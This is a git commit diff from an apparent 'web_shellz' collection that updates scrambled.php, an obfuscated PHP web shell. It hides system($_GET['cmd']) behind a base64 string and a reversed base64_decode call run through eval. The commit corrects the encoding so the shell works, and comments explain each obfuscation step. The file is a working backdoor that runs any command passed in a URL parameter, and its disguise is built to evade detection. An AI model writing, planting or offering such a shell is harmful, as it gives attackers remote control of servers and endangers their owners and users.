aa107b9cf2f1c8f455f85def24233610c838e9a6
kymb0 <55473161+kymb0@users.noreply.github.com>
2020-11-15 17:08:47 +0930

    Update scrambled.php

--- web_shellz/scrambled.php
+++ web_shellz/scrambled.php
@@ -1,11 +1,12 @@
+//NOTE when encoding your shell you MUST append a semi-colon c3lzdGVtKCRfR0VUWyJjbWQiXSk7
 //scrambled:
-<?php $k='c3lzdGVtKCRfR0VUWyJjbWQiXSk=';$c=strrev('(edoced_46esab.""nruter')."'".$k."');";$f=eval($c);eval($f);?>
+<?php $k='c3lzdGVtKCRfR0VUWyJjbWQiXSk7';$c=strrev('(edoced_46esab.""nruter')."'".$k."');";$f=eval($c);eval($f);?>
 
 // Unscrambled:
 // base_64 encoded string -> system($_GET["cmd"]);
-$k='c3lzdGVtKCRfR0VUWyJjbWQiXSk=';
+$k='c3lzdGVtKCRfR0VUWyJjbWQiXSk7';
 // strrev() reverses a given string:   strrev('(edoced_46esab.""nruter')."'".$k."')
-$c= eval("return base64_decode('c3lzdGVtKCRfR0VUWyJjbWQiXSk=');");
+$c= eval("return base64_decode('c3lzdGVtKCRfR0VUWyJjbWQiXSk7');");
 // $c = system($_GET["cmd"]);
 $f=eval($c);
 eval($f);
